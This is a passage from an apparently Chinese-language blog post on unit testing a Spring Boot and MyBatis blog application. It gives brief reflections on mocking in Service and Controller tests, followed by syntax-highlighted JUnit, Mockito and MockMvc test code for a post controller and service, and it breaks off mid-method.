    <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThat</span><span class="token punctuation">(</span>savedPokemon<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isGreaterThan</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> </p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ol>
<li>在对Service层做测试时，一定要Mock数据访问对象吗？</li>
</ol>
<p>如果测试的Service对象，方法对数据进行了多种操作，我希望能看到是否能正确的配合，那这里就可以使用真实的数据访问对象。优点就是能测出真实情况，缺点就是不灵活，无法更纯粹的测试Service中的代码。</p>
<ol start="2">
<li>在对Controller层做测试时，如果进行大量操作，是否应该除了断言返回内容，还需要断言其他的内容呢？</li>
</ol>
<p>比如调用接口：/printOrder，这个接口进行了：打印订单，增加积分，更改订单状态之类的操作，需要对这些操作进行断言判断吗？不需要，如果说Controller中依赖的外部对象都被mock掉了，那这些断言无意义，因为根本没有进行真实的操作。如果说Controller中依赖的外部对象都是真实的，也没有必要，因为只需要管好接口返回是否正常，其他操作应有各自的组件进行充分的测试。但如果说是一些老项目，本身并没有完整的测试用例，单纯对接口层写测试，也会有断言过于繁琐的问题。</p>
<h2 id="自己编写的测试Demo"><a href="#自己编写的测试Demo" class="headerlink" title="自己编写的测试Demo"></a>自己编写的测试Demo</h2><p>使用：SpringBoot + Mybatis + Mysql(开发环境) + H2(测试环境)</p>
<h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">PostService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">BeforeEach</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">WebMvcTest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>mock<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">MockBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">MediaType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">MockMvc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ResultActions</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>hamcrest<span class="token punctuation">.</span></span><span class="token class-name">Matchers</span><span class="token punctuation">.</span><span class="token static">hasSize</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">ArgumentMatchers</span><span class="token punctuation">.</span><span class="token static">any</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">ArgumentMatchers</span><span class="token punctuation">.</span><span class="token static">anyLong</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">Mockito</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>request<span class="token punctuation">.</span></span><span class="token class-name">MockMvcRequestBuilders</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">MockMvcResultHandlers</span><span class="token punctuation">.</span><span class="token static">print</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">MockMvcResultMatchers</span><span class="token punctuation">.</span><span class="token static">jsonPath</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">MockMvcResultMatchers</span><span class="token punctuation">.</span><span class="token static">status</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@WebMvcTest</span><span class="token punctuation">(</span><span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">PostControllerTest</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token class-name">MockMvc</span> mockMvc<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@MockBean</span>
    <span class="token class-name">PostService</span> postService<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token class-name">ObjectMapper</span> objectMapper<span class="token punctuation">;</span>

    <span class="token class-name">Post</span> post<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@BeforeEach</span>
    <span class="token keyword">void</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        post <span class="token operator">=</span> <span class="token class-name">Post</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">content</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testCreatePost_ReturnIsCreated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Arrange</span>
        <span class="token function">when</span><span class="token punctuation">(</span>postService<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token class-name">Post</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Act</span>
        <span class="token class-name">ResultActions</span> response <span class="token operator">=</span> mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/post/create"</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">contentType</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_JSON</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">content</span><span class="token punctuation">(</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Assert</span>
        response<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isCreated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$.id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$.title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$.content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testGetAllPost_ReturnListOfPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Arrange</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Post</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">singletonList</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">when</span><span class="token punctuation">(</span>postService<span class="token punctuation">.</span><span class="token function">getAllPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Act</span>
        <span class="token class-name">ResultActions</span> response <span class="token operator">=</span> mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/post/list"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Assert</span>
        response<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token function">hasSize</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andDo</span><span class="token punctuation">(</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testDeletePost_ReturnOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Arrange</span>
        <span class="token function">doNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">when</span><span class="token punctuation">(</span>postService<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span><span class="token function">anyLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Act</span>
        <span class="token class-name">ResultActions</span> response <span class="token operator">=</span> mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">"/api/post/1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Assert</span>
        response<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testUpdatePost_ReturnPostUpdated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token function">when</span><span class="token punctuation">(</span>postService<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token class-name">Post</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ResultActions</span> perform <span class="token operator">=</span> mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"/api/post/"</span> <span class="token operator">+</span> post<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">contentType</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_JSON</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">content</span><span class="token punctuation">(</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        perform<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isOk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$.id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>service</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">PostMapper</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>qinsicheng<span class="token punctuation">.</span>blog<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">PostServiceImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Assertions</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">BeforeEach</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span>extension<span class="token punctuation">.</span></span><span class="token class-name">ExtendWith</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">InjectMocks</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">Mock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span></span><span class="token class-name">MockitoExtension</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">CollectionUtils</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token static">assertAll</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token static">assertNotNull</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">ArgumentMatchers</span><span class="token punctuation">.</span><span class="token static">notNull</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">Mockito</span><span class="token punctuation">.</span><span class="token static">doNothing</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">org<span class="token punctuation">.</span>mockito<span class="token punctuation">.</span></span><span class="token class-name">Mockito</span><span class="token punctuation">.</span><span class="token static">when</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@ExtendWith</span><span class="token punctuation">(</span><span class="token class-name">MockitoExtension</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">PostServiceTest</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@Mock</span>
    <span class="token class-name">PostMapper</span> postMapper<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@InjectMocks</span>
    <span class="token class-name">PostServiceImpl</span> postService<span class="token punctuation">;</span>

    <span class="token class-name">Post</span> post<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@BeforeEach</span>
    <span class="token keyword">void</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        post <span class="token operator">=</span> <span class="token class-name">Post</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">content</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testCreatePost_ReturnOneRowAffect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">when</span><span class="token punctuation">(</span>postMapper<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Post</span> postRs <span class="token operator">=</span> postService<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertNotNull</span><span class="token punctuation">(</span>postRs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testDeletePostById_IfIdIsNullOrNegative_ThrowIllegalArgumentException</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThrows</span><span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            postService<span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThrows</span><span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            postService<span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testDeletePostById_ReturnVoid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">doNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">when</span><span class="token punctuation">(</span>postMapper<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span><span class="token function">notNull</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">assertAll</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            postService<span class="token punctuation">.</span><span class="token function">deleteById</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testListPost_ReturnList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
